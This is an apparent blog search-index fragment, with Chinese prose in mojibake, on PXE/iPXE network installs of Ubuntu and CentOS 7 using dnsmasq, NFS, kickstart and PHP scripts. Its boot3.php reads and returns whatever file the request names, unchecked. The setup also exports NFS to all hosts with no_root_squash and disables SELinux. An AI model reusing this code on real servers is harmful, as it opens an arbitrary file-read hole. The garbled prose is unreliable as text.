class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://mirrors.163.com/ubuntu-releases/16.04/ubuntu-16.04-desktop-amd64.iso  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åæŠŠvmlinuz.efiå’Œinitrd.lzå¼„å‡ºæ¥ï¼Œæ”¾åˆ°[\u003ca href=\"http://172.16.8.1/ks/ubuntu\"\u003ehttp://172.16.8.1/ks/ubuntu\u003c/a\u003e]ç›®å½•ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount -o loop ubuntu-16.04-desktop-amd64.iso /mnt/iso  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /mnt/iso/casper/vmlinuz.efi /var/www/html/ks/ubuntu  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /mnt/iso/casper/initrd.lz /var/www/html/ks/ubuntu  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå»ºç«‹nfsï¼ŒæŠŠisoé‡Œçš„ä¸œè¥¿éƒ½å¼„åˆ°nfså…±äº«é‡Œå»ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /export/ubuntu  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/exports  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/ubuntu *\u003cspan class=\"o\"\u003e(\u003c/span\u003erw,sync,no_subtree_check,fsid\u003cspan class=\"o\"\u003e=\u003c/span\u003e0,no_root_squash\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y nfs-utils rpcbind  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice nfs start  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eokï¼Œå¯åŠ¨pxeï¼Œå°±çœ‹åˆ°æ¡Œé¢äº†ã€‚\n\u003cimg alt=\"image-20240118135302316\" loading=\"lazy\" src=\"/posts/20240118-pxe_utuntu_desk/image-20240118135302316.png\"\u003e\u003c/p\u003e","title":"ç”¨IPXEå¯åŠ¨ä¸ªUbuntuæ¡Œé¢"},{"content":"è¿™äº›å¹´IDCç‰©ç†æœºè£…æœºçš„å¤§æ³•ä¹Ÿåœ¨ä¸æ–­è¡è¿›ï¼Œä»æœ€æ—©çš„æ‰‹åŠ¨è£…ä¸€å †tftp/dhcp/syslinux/httpdï¼Œåˆ°cobblerçš„ä¸€ç»Ÿæ±Ÿæ¹–ï¼Œåˆ°ç°åœ¨çš„dnsmasqè½»é‡çº§å®‰è£…ï¼Œnocpså®‰è£…ï¼Œä¸€ç›´åœ¨ä¸æ–­è¿›åŒ–ç€ã€‚\nå› ä¸ºcobblerå®åœ¨å¤ªé‡ï¼Œä¸å¾—ä¸ä¸“é—¨èµ·ä¸€ä¸ªkvmè™šæœºæ¥è¿è¡Œï¼Œå®Œå…¨ä¸å–œæ¬¢å•Šã€‚æ‰€ä»¥ä¸€ç›´ä¹Ÿåœ¨ç ”ç©¶ç»ˆæå®‰è£…æœåŠ¡å™¨çš„å¤§æ³•ã€‚\næŠ˜è…¾æœåŠ¡å™¨æ— æ•°å›ï¼Œæ‰¾å‡ºäº†ä¸ªè‡ªå·±æ¯”è¾ƒå–œæ¬¢çš„æ–¹å¼ã€‚\né¦–å…ˆä»‹ç»ä¸€ä¸‹èƒŒæ™¯çŸ¥è¯†ï¼š\nPXE å¯ä»¥é€šè¿‡ç½‘ç»œç»™è®¡ç®—æœºå®‰è£…æ“ä½œç³»ç»Ÿã€‚ PXEåè®®å¤§è‡´ä¸Šç»“åˆäº†DHCPå’ŒTFTPã€‚\ngPXE gPXEæ˜¯PXEçš„ä¸€ä¸ªå¼€æºå®ç°ï¼ˆæ›´æ—©çš„å®ç°æ˜¯Etherbootï¼‰ã€‚é€šè¿‡gPXEèƒ½è®©ç½‘å¡ç›´æ¥æ”¯æŒç½‘ç»œå¯åŠ¨ï¼Œè€Œä¸ä¾èµ–äºç½‘å¡è‡ªå¸¦çš„PXEå›ºä»¶ã€‚åŒæ—¶ç›¸æ¯”PXEï¼ŒgPXEæ”¯æŒæ›´å¤šçš„åè®®ã€‚ ä¼ ç»Ÿçš„PXEåªèƒ½é€šè¿‡TFTPè¿›è¡Œä¼ è¾“ï¼Œè€ŒgPXEæ”¯æŒHTTPï¼ŒiSCSIå’ŒATA over Ethernetï¼ˆAoEï¼‰ï¼Œç”šè‡³æ”¯æŒwifié“¾æ¥ã€‚\niPXE iPXEè¡¨ç¤º it doesn\u0026rsquo;t PXEã€‚iPXEæ˜¯gPXEçš„åŸç­äººé©¬å†™çš„ï¼ˆä»–ä»¬ä»Etherbootå¼€å§‹ï¼‰ï¼Œä½œä¸ºå®˜æ–¹çš„gPXEçš„æ›¿ä»£å“ã€‚ gPXEæ‰©å±•çš„åŠŸèƒ½åœ¨iPXEä¸­éƒ½å¾—åˆ°æ”¯æŒã€‚ ä¹‹æ‰€ä»¥ä¸å†ä½¿ç”¨gPXEæ˜¯ç”±äºå­˜åœ¨ç‰ˆæƒçº çº·ï¼ŒiPXEä»2010å¹´4æœˆå¼€å§‹ï¼ŒåŸºäºåŒä¸€ä¸ªä»£ç åº“å¼€å§‹å¼€å‘ã€‚\nPXELINUX Syslinuxæ˜¯ä¸€ä¸ªä¼˜ç§€çš„ç³»ç»Ÿå¯åŠ¨åŠ è½½å™¨(bootloader)ï¼Œå¯å¼•å¯¼è‡ªç¡¬ç›˜ã€å…‰ç›˜ã€å’Œé€šè¿‡PXEçš„ç½‘ç»œå¯åŠ¨ã€‚ PXELINUXæ´¾ç”Ÿè‡ªSyslinuxï¼Œç”¨æ¥ä½¿æ”¯æŒPXEçš„ç½‘å¡ä»ç½‘ç»œå¼•å¯¼å¯åŠ¨Linuxã€‚PXELINUXç¨‹åºä¸æ˜¯çƒ§åœ¨ç½‘å¡é‡Œï¼Œè€Œæ˜¯å­˜å‚¨åœ¨TFTPæœåŠ¡å™¨ä¸Šã€‚\nChainloading iPXE å¯ä»¥æŠŠiPXEå½“ä½œå›ºä»¶åˆ·è¿›è®¡ç®—æœºç½‘å¡çš„ROMé‡Œæ›¿æ¢æ‰è‡ªå¸¦çš„PXEï¼Œä½†æ›´ä¸ºå¸¸è§çš„æ˜¯é€šè¿‡chainloadingçš„æ–¹å¼è¿›å…¥iPXEã€‚\næœ‰ç‚¹æ™•æ˜¯å§ï¼Œæ€»ç»“ä¸€ä¸‹ï¼ŒpxeåŒ…å«äº†gpxe/ipxe/pxelinuxï¼Œipxeæ˜¯æœ€æ–°çš„ï¼Œgpxe/ipxe/pxelinuxå¯ä»¥é€šè¿‡chainçš„æ–¹å¼é¡¶æ›¿ç½‘å¡åŸç”Ÿçš„pxeã€‚\næ¨èçš„è£…æœºæ–¹å¼ï¼š\nå®¢æˆ·æœºå¯åŠ¨ç½‘å¡è‡ªå¸¦çš„å›ºä»¶pxeï¼Œç„¶åå»æœåŠ¡å™¨æ‹‰ä¸€ä¸ªgpxe/ipxeï¼Œç„¶åå¯åŠ¨è¿™ä¸ªgpxe/ipxeï¼Œå†å»æœåŠ¡å™¨æ‹‰å…·ä½“çš„å¯åŠ¨æ–‡ä»¶ï¼Œè¿™ç§å°±æ˜¯chainæ–¹å¼äº†ã€‚æˆ‘ä»¬å°±å¯ä»¥ç”¨åˆ°http/iscsi/wifiç­‰å„ç§å…ˆè¿›æ–¹å¼å¯åŠ¨äº†ã€‚\næˆ‘ä»¬ç¬¬ä¸€æ­¥å…ˆè¦å‡†å¤‡ä¸€ä¸ªgpxeçš„bootæ–‡ä»¶ã€‚\nè§£é‡Šä¸€ä¸‹ï¼Œæ–‡ä»¶åç¼€æœ‰.pxe/.kpxe/.kkpxeï¼Œè¿™æ˜¯ä¸ªé€’è¿›å…³ç³»ï¼Œ.pxeæ˜¯æœ€åŸç”Ÿçš„ç½‘å¡é©±åŠ¨ï¼Œ.kpxeåŒ…å«äº†è°ƒç”¨åŸç”Ÿç½‘å¡çš„UNDIé©±åŠ¨(æ— ç½‘å¡é©±åŠ¨ï¼‰ï¼Œ.kkpxeæ›´è¿›ä¸€æ­¥ï¼ŒåŒ…å«äº†UNDI+PXEåŸç”Ÿç½‘å¡çš„é©±åŠ¨ã€‚\nå½“ç„¶é€‰æ‹©.kpxeäº†ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯é€šè¿‡è¿™ä¸ªipxeè°ƒç”¨åŸç”Ÿç½‘å¡ä¸Šçš„é©±åŠ¨å³å¯ï¼Œå¦‚æœæ˜¯ä½ è‡ªå·±è¦çƒ§ç½‘å¡çš„bootroomç‰‡å­ï¼Œå°±å¾—é€‰æ‹©æ‰€æœ‰é©±åŠ¨äº†ã€‚\nè¿™æ ·æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª gpxe-1.0.1-undionly.kpxe çš„æ–‡ä»¶ï¼Œä¿å­˜å¤‡ç”¨ã€‚\nç„¶åæˆ‘ä»¬æ¥è®¾ç½®Dnsmasq:\nlog-dhcp dhcp-no-override enable-tftp tftp-root = /tftpboot dhcp-range=tftp,172.16.36.100,172.16.36.105 dhcp-match=gpxe,175 dhcp-boot=net:#gpxe,gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1 dhcp-boot=http://172.16.8.1/ks/boot.txt æ³¨æ„ï¼šgpxe-1.0.1-undionly.kpxeæ˜¯æ”¾åœ¨/tftpboot/gpxe/ä¹‹ä¸‹çš„\nä¸Šé¢æœ‰å¾ˆå¤šç„æœºï¼Œdhcp-rangeæ˜¯éšä¾¿è®¾ä¸€ä¸ªåœ°å€æ± ï¼Œå› ä¸ºæœ€ç»ˆå®é™…æ˜¯gpxeæ¥å†³å®šåœ°å€ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡dhcpå¾—åˆ°çš„åœ°å€åè€Œä¸é‡è¦äº†ã€‚dhcp-no-overrideä¸€å®šè¦æœ‰ï¼Œå¦åˆ™gpxeæœ‰bugï¼Œæ— æ³•å¯åŠ¨ã€‚\nå…¶æ¬¡åŒ¹é…gpxeï¼Œå‡¡æ˜¯175çš„éƒ½æ˜¯gpxeï¼Œä¸ºä»€ä¹ˆè¦åŒ¹é…å‘¢ï¼Ÿçœ‹ä¸‹é¢ï¼Œæœ‰ä¸¤ä¸ªdhcp-bootå¯åŠ¨é€‰é¡¹ï¼Œ#pxeï¼Œ#è¡¨ç¤ºä¸æ˜¯ï¼Œè¿™è¡Œæ„æ€æ˜¯:ä¸æ˜¯gpxeå¯åŠ¨çš„è¯ç”¨/tftp/gpxe/gpxe-1.0.1-undionly.kpxeæ¥å¯åŠ¨ï¼Œdhcpçš„serveræ˜¯172.16.36.1ã€‚ç¬¬äºŒè¡Œå¦‚æœæ˜¯gpxeå¯åŠ¨çš„è¯ï¼Œå°±chainåˆ°[http://172.16.8.1/ks/boot.txt]å»å¯åŠ¨\nå‘µå‘µï¼Œå¦‚æœä¸è¿™ä¹ˆè®¾ç½®ï¼Œå°±ç”¨ä¸€è¡Œçš„è¯ï¼š\ndhcp-boot=gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1 å°±ä¼šé™·å…¥æ­»å¾ªç¯ï¼Œé¦–å…ˆpxeå¯åŠ¨ï¼ŒæŠ“äº†ä¸ªgpxeï¼Œgpxeåˆå¯åŠ¨æŠ“äº†ä¸ªgpxeï¼ŒåˆæŠ“gpxeï¼Œå¾ªç¯å¾€å¤æ²¡ç©æ²¡äº†ã€‚æ‰€ä»¥å¿…é¡»æ ‡è®°gpxeï¼Œå¹¶è·³å‡ºè¿™ä¸ªå¾ªç¯ã€‚\næˆ‘ä»¬åœ¨172.16.8.1ä¸Šé¢å»ºç«‹/centos7çš„yumå®‰è£…æºï¼ŒåŒæ—¶å»ºç«‹/ksç›®å½•ã€‚å‡†å¤‡boot.txtï¼Œboot2.phpï¼Œboot3.phpï¼Œcentos7.kså››ä¸ªæ–‡ä»¶ï¼Œä¸‹é¢ä¸€ä¸ªä¸€ä¸ªè§£é‡Šï¼š\né¦–å…ˆæ˜¯boot.txt\ncat boot.txt #!gpxe chain http://172.16.8.1/ks/boot2.php?uuid=\\${uuid}\u0026amp;mac=\\${mac}\u0026amp;busid=\\${busid}\u0026amp;ip=\\${ip}\u0026amp;hostname=\\${hostname:uristring}\u0026amp;serial=\\${serial:uristring}\u0026amp;asset=\\${asset:uristring}\u0026amp;manufacturer=\\${manufacturer:uristring}\u0026amp;product=\\${product:uristring} å¤§å®¶çœ‹ä¸Šé¢ï¼Œboot.txtæ˜¯ä¸ªgpxeè„šæœ¬ï¼Œå®é™…æ˜¯è®©gpxeå‘boot2.phpä¼ è¾“äº†ä¸€äº›æ•°æ®è¿‡æ¥ï¼Œæœ‰æœºå™¨çš„uuid/mac/busid/hostname/serial/productç­‰ç­‰ã€‚ç»™ä¸ªå…·ä½“çš„ä¾‹å­ï¼Œä»access.logçœ‹åˆ°å®é™…å‘è¿‡æ¥çš„è¯·æ±‚å¦‚ä¸‹ï¼š\n\u0026#34;GET /ks/boot2.php?uuid=%5C44454c4c-5600-1054-8042-b1c04f433532\u0026amp;mac=%5Cec%3Af4%3Abb%3Ad9%3A96%3A40\u0026amp;busid=%5C01%3A80%3A86%3A15%3A21\u0026amp;ip=%5C172.16.36.100\u0026amp;hostname=%5C\u0026amp;serial=%5C1VTBC52\u0026amp;asset=%5C\u0026amp;manufacturer=%5CDell%20Inc.\u0026amp;product=%5CPowerEdge%20R730 HTTP/1.0\u0026#34; 200 46 \u0026#34;-\u0026#34; \u0026#34;gPXE/1.0.1\u0026#34; \u0026#34;-\u0026#34; çœ‹ä¸Šé¢ï¼Œæœ‰å¾ˆå¤šä¿¡æ¯ï¼Œç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œè¿˜æœ‰serialï¼Œå¯¹åº”dellå°±æ˜¯svc tagå·ï¼Œè¿˜æœ‰æœºå™¨ç±»åˆ«PowerEdge R730ï¼Œè¿™æ˜¯ä¸ªå¥½ä¸œè¥¿å•Šã€‚\næˆ‘ä»¬è´­ä¹°æœºå™¨çš„æ—¶å€™è‚¯å®šæœ‰åºåˆ—å·ï¼Œä¸Šæ¶åˆ°æœºæˆ¿çš„æ—¶å€™ï¼Œå¯ä»¥è®©idcæŠ„ä¸‹æ¥æœºæŸœå’Œåºåˆ—å·ï¼Œç„¶åæˆ‘ä»¬è®©ç½‘ç®¡è§„åˆ’å¥½ipï¼Œå†è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨serialæ¥ç¡®å®šæœºå™¨åº”è¯¥æŒ‰å“ªä¸ªæ¨¡æ¿å®‰è£…ã€‚\nå†çœ‹æ¨¡æ¿æ–‡ä»¶ï¼Œcentos7.ks\n#version=DEVEL auth --enableshadow --passalgo=sha512 url --url=http://172.16.8.1/centos7 text firstboot --enable ignoredisk --only-use=sda keyboard --vckeymap=us --xlayouts=\u0026#39;us\u0026#39; lang en_US.UTF-8 selinux --disabled services --enabled=\u0026#34;chronyd\u0026#34; network --bootproto=static --device=em1 --noipv6 --nodns --onboot=yes --gateway={gateway} --ip={ip} --nameserver=172.16.8.1 --netmask={netmask} network --bootproto=dhcp --device=em2 --noipv6 --nodns --onboot=no network --bootproto=dhcp --device=em3 --noipv6 --nodns --onboot=no network --bootproto=dhcp --device=em4 --noipv6 --nodns --onboot=no network --hostname={hostname} #grub-crypt --sha-512 rootpw --iscrypted $6$0Y.SH935/jvt0X.D$lCte9H/KiFeGbTGrrcuXGZXmnq3Rk4Crz8nAvCgH.Pf2SNmoUdh.g5WGWJqtVO4QTyqvnXc/6FyVjptWIaM4w1 timezone Asia/Shanghai --isUtc bootloader --append=\u0026#34; crashkernel=auto\u0026#34; --location=mbr --boot-drive=sda clearpart --all --drives=sda part /boot --fstype ext4 --size=500 --ondisk=/dev/sda part swap --size=8192 --ondisk=/dev/sda part / --fstype ext4 --size=1024 --grow --ondisk=/dev/sda %packages @compat-libraries @core wget net-tools chrony bridge-utils %end %post yum -y erase NetworkManager cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/sysconfig/network-scripts/ifcfg-br0 DEVICE=br0 TYPE=Bridge BOOTPROTO=static ONBOOT=yes IPADDR={ip} NETMASK={netmask} GATEWAY={gateway} EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/modprobe.d/bonding.conf alias bond0 bonding BONDING_OPTS=\u0026#34;miimon=100 mode=1 primary=em1\u0026#34; EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-bond0 DEVICE=bond0 ONBOOT=yes USERCTL=no BRIDGE=br0 EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-em1 DEVICE=em1 USERCTL=no ONBOOT=yes MASTER=bond0 SLAVE=yes BRIDGE=\u0026#34;br0\u0026#34; EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-em2 DEVICE=em2 USERCTL=no ONBOOT=yes MASTER=bond0 SLAVE=yes BRIDGE=\u0026#34;br0\u0026#34; EOF %end reboot æ³¨æ„ä¸Šé¢ï¼Œ{ip}ã€{netmask}ã€{gateway}ã€{hostname}æ˜¯å¾…å®šçš„ã€‚\nç„¶åçœ‹çœ‹boot2.php:\n\u0026lt;?php $dns=\u0026#39;172.16.8.1\u0026#39;; $base7=\u0026#39;http://172.16.8.1/centos7\u0026#39;; $ks7=\u0026#39;http://172.16.8.1/ks/boot3.php\u0026#39;; echo \u0026#34;#!gpxe\\n\u0026#34;; switch ($_REQUEST[\u0026#39;mac\u0026#39;]) { case \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; $ipa=explode(\u0026#39;:\u0026#39;,$ip); echo \u0026#34;ifopen net0\\n\u0026#34;; echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; echo \u0026#34;set net0/dns $dns\\n\u0026#34;; echo \u0026#34;set base-url $base7\\n\u0026#34;; echo \u0026#34;kernel \\${base-url}/images/pxeboot/vmlinuz\\n\u0026#34;; echo \u0026#34;imgargs vmlinuz inst.ks=$ks7?file=centos7.ks\u0026amp;ip=$ipa[0]\u0026amp;mask=$ipa[2]\u0026amp;gateway=$ipa[1]\u0026amp;hostname=$ipa[3] ksdevice=bootif inst.vnc inst.vncpassword=xxxxxxxx inst.sshd\\n\u0026#34;; echo \u0026#34;initrd \\${base-url}/images/pxeboot/initrd.img\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; break; case \u0026#39;00:11:22:33:44:55\u0026#39;: # boot from iSCSI echo \u0026#34;set initiator-iqn iqn.2007-08.com.example.initiator:initiator\\n\u0026#34;; # see http://ipxe.org/sanuri for the syntax echo \u0026#34;sanboot iscsi:san.example.com:6:3260:0:iqn.2007-08.com.example.san:sometarget\\n\u0026#34;; break; case \u0026#39;\\00:77:21:ab:cd:ee\u0026#39;: # boot boot.salstar.sk\u0026#39;s super cool boot menu echo \u0026#34;chain http://boot.salstar.sk\\n\u0026#34;; break; default: # exit iPXE and let machine go on with BIOS boot sequence echo \u0026#34;exit\\n\u0026#34;; break; } ?\u0026gt; æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡ç½‘å¡çš„ç‰©ç†åœ°å€æ¥åˆ¤æ–­æ¨¡æ¿çš„ï¼Œç”¨svc tagå·æ›´å¥½ã€‚\nç¬¬å››ä¸ªæ–‡ä»¶ï¼šboot3.php\n\u0026lt;?php $origin_str = file_get_contents($_REQUEST[\u0026#39;file\u0026#39;]); $update_str = str_replace(\u0026#34;{ip}\u0026#34;, $_REQUEST[\u0026#39;ip\u0026#39;], $origin_str); $update_str = str_replace(\u0026#39;{netmask}\u0026#39;, $_REQUEST[\u0026#39;mask\u0026#39;], $update_str); $update_str = str_replace(\u0026#39;{gateway}\u0026#39;, $_REQUEST[\u0026#39;gateway\u0026#39;], $update_str); $update_str = str_replace(\u0026#39;{hostname}\u0026#39;, $_REQUEST[\u0026#39;hostname\u0026#39;], $update_str); echo $update_str; ?\u0026gt; boot3.phpçš„åŠŸèƒ½å°±æ˜¯æ›¿æ¢æ‰æ¨¡æ¿æ–‡ä»¶é‡Œçš„ipç­‰ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ­£ç¡®çš„ksæ–‡ä»¶ã€‚\nè¿™ä¸‹å°±å®Œç¾äº†ï¼Œæˆ‘ä»¬åŸºæœ¬å°±éœ€è¦ä¿®æ”¹ksä¸‹çš„boot2.phpå’Œcentos7.ksï¼Œå°±å¯ä»¥æ§åˆ¶è¿œç¨‹å®‰è£…äº†ã€‚\ndhcpå’Œtftpï¼Œå°±ç”¨dnsmasqå’Œé‚£ä¸€ä¸ªgxpeå°±å¤Ÿäº†ï¼Œçœäº†å¤§äº‹äº†ã€‚\nè¿˜æœ‰æ›´å¥½ç©çš„: ç½‘å¡åŸç”Ÿpxe\u0026ndash;\u0026gt;gpxe\u0026ndash;\u0026gt;pxelinux.0\nå¤§å®¶å°½æƒ…æƒ³è±¡å§ã€‚\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_install/","summary":"\u003cp\u003eè¿™äº›å¹´IDCç‰©ç†æœºè£…æœºçš„å¤§æ³•ä¹Ÿåœ¨ä¸æ–­è¡è¿›ï¼Œä»æœ€æ—©çš„æ‰‹åŠ¨è£…ä¸€å †tftp/dhcp/syslinux/httpdï¼Œåˆ°cobblerçš„ä¸€ç»Ÿæ±Ÿæ¹–ï¼Œåˆ°ç°åœ¨çš„dnsmasqè½»é‡çº§å®‰è£…ï¼Œnocpså®‰è£…ï¼Œä¸€ç›´åœ¨ä¸æ–­è¿›åŒ–ç€ã€‚\u003c/p\u003e\n\u003cp\u003eå› ä¸ºcobblerå®åœ¨å¤ªé‡ï¼Œä¸å¾—ä¸ä¸“é—¨èµ·ä¸€ä¸ªkvmè™šæœºæ¥è¿è¡Œï¼Œå®Œå…¨ä¸å–œæ¬¢å•Šã€‚æ‰€ä»¥ä¸€ç›´ä¹Ÿåœ¨ç ”ç©¶ç»ˆæå®‰è£…æœåŠ¡å™¨çš„å¤§æ³•ã€‚\u003c/p\u003e\n\u003cp\u003eæŠ˜è…¾æœåŠ¡å™¨æ— æ•°å›ï¼Œæ‰¾å‡ºäº†ä¸ªè‡ªå·±æ¯”è¾ƒå–œæ¬¢çš„æ–¹å¼ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆä»‹ç»ä¸€ä¸‹èƒŒæ™¯çŸ¥è¯†ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePXE\nå¯ä»¥é€šè¿‡ç½‘ç»œç»™è®¡ç®—æœºå®‰è£…æ“ä½œç³»ç»Ÿã€‚ PXEåè®®å¤§è‡´ä¸Šç»“åˆäº†DHCPå’ŒTFTPã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003egPXE\ngPXEæ˜¯PXEçš„ä¸€ä¸ªå¼€æºå®ç°ï¼ˆæ›´æ—©çš„å®ç°æ˜¯Etherbootï¼‰ã€‚é€šè¿‡gPXEèƒ½è®©ç½‘å¡ç›´æ¥æ”¯æŒç½‘ç»œå¯åŠ¨ï¼Œè€Œä¸ä¾èµ–äºç½‘å¡è‡ªå¸¦çš„PXEå›ºä»¶ã€‚åŒæ—¶ç›¸æ¯”PXEï¼ŒgPXEæ”¯æŒæ›´å¤šçš„åè®®ã€‚ ä¼ ç»Ÿçš„PXEåªèƒ½é€šè¿‡TFTPè¿›è¡Œä¼ è¾“ï¼Œè€ŒgPXEæ”¯æŒHTTPï¼ŒiSCSIå’ŒATA over Ethernetï¼ˆAoEï¼‰ï¼Œç”šè‡³æ”¯æŒwifié“¾æ¥ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eiPXE\niPXEè¡¨ç¤º it doesn\u0026rsquo;t PXEã€‚iPXEæ˜¯gPXEçš„åŸç­äººé©¬å†™çš„ï¼ˆä»–ä»¬ä»Etherbootå¼€å§‹ï¼‰ï¼Œä½œä¸ºå®˜æ–¹çš„gPXEçš„æ›¿ä»£å“ã€‚  gPXEæ‰©å±•çš„åŠŸèƒ½åœ¨iPXEä¸­éƒ½å¾—åˆ°æ”¯æŒã€‚ ä¹‹æ‰€ä»¥ä¸å†ä½¿ç”¨gPXEæ˜¯ç”±äºå­˜åœ¨ç‰ˆæƒçº çº·ï¼ŒiPXEä»2010å¹´4æœˆå¼€å§‹ï¼ŒåŸºäºåŒä¸€ä¸ªä»£ç åº“å¼€å§‹å¼€å‘ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePXELINUX\nSyslinuxæ˜¯ä¸€ä¸ªä¼˜ç§€çš„ç³»ç»Ÿå¯åŠ¨åŠ è½½å™¨(bootloader)ï¼Œå¯å¼•å¯¼è‡ªç¡¬ç›˜ã€å…‰ç›˜ã€å’Œé€šè¿‡PXEçš„ç½‘ç»œå¯åŠ¨ã€‚  PXELINUXæ´¾ç”Ÿè‡ªSyslinuxï¼Œç”¨æ¥ä½¿æ”¯æŒPXEçš„ç½‘å¡ä»ç½‘ç»œå¼•å¯¼å¯åŠ¨Linuxã€‚PXELINUXç¨‹åºä¸æ˜¯çƒ§åœ¨ç½‘å¡é‡Œï¼Œè€Œæ˜¯å­˜å‚¨åœ¨TFTPæœåŠ¡å™¨ä¸Šã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eChainloading iPXE\nå¯ä»¥æŠŠiPXEå½“ä½œå›ºä»¶åˆ·è¿›è®¡ç®—æœºç½‘å¡çš„ROMé‡Œæ›¿æ¢æ‰è‡ªå¸¦çš„PXEï¼Œä½†æ›´ä¸ºå¸¸è§çš„æ˜¯é€šè¿‡chainloadingçš„æ–¹å¼è¿›å…¥iPXEã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæœ‰ç‚¹æ™•æ˜¯å§ï¼Œæ€»ç»“ä¸€ä¸‹ï¼ŒpxeåŒ…å«äº†gpxe/ipxe/pxelinuxï¼Œipxeæ˜¯æœ€æ–°çš„ï¼Œgpxe/ipxe/pxelinuxå¯ä»¥é€šè¿‡chainçš„æ–¹å¼é¡¶æ›¿ç½‘å¡åŸç”Ÿçš„pxeã€‚\u003c/p\u003e\n\u003cp\u003eæ¨èçš„è£…æœºæ–¹å¼ï¼š\u003c/p\u003e\n\u003cp\u003eå®¢æˆ·æœºå¯åŠ¨ç½‘å¡è‡ªå¸¦çš„å›ºä»¶pxeï¼Œç„¶åå»æœåŠ¡å™¨æ‹‰ä¸€ä¸ªgpxe/ipxeï¼Œç„¶åå¯åŠ¨è¿™ä¸ªgpxe/ipxeï¼Œå†å»æœåŠ¡å™¨æ‹‰å…·ä½“çš„å¯åŠ¨æ–‡ä»¶ï¼Œè¿™ç§å°±æ˜¯chainæ–¹å¼äº†ã€‚æˆ‘ä»¬å°±å¯ä»¥ç”¨åˆ°http/iscsi/wifiç­‰å„ç§å…ˆè¿›æ–¹å¼å¯åŠ¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç¬¬ä¸€æ­¥å…ˆè¦å‡†å¤‡ä¸€ä¸ªgpxeçš„bootæ–‡ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼Œæ–‡ä»¶åç¼€æœ‰.pxe/.kpxe/.kkpxeï¼Œè¿™æ˜¯ä¸ªé€’è¿›å…³ç³»ï¼Œ.pxeæ˜¯æœ€åŸç”Ÿçš„ç½‘å¡é©±åŠ¨ï¼Œ.kpxeåŒ…å«äº†è°ƒç”¨åŸç”Ÿç½‘å¡çš„UNDIé©±åŠ¨(æ— ç½‘å¡é©±åŠ¨ï¼‰ï¼Œ.kkpxeæ›´è¿›ä¸€æ­¥ï¼ŒåŒ…å«äº†UNDI+PXEåŸç”Ÿç½‘å¡çš„é©±åŠ¨ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶é€‰æ‹©.kpxeäº†ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯é€šè¿‡è¿™ä¸ªipxeè°ƒç”¨åŸç”Ÿç½‘å¡ä¸Šçš„é©±åŠ¨å³å¯ï¼Œå¦‚æœæ˜¯ä½ 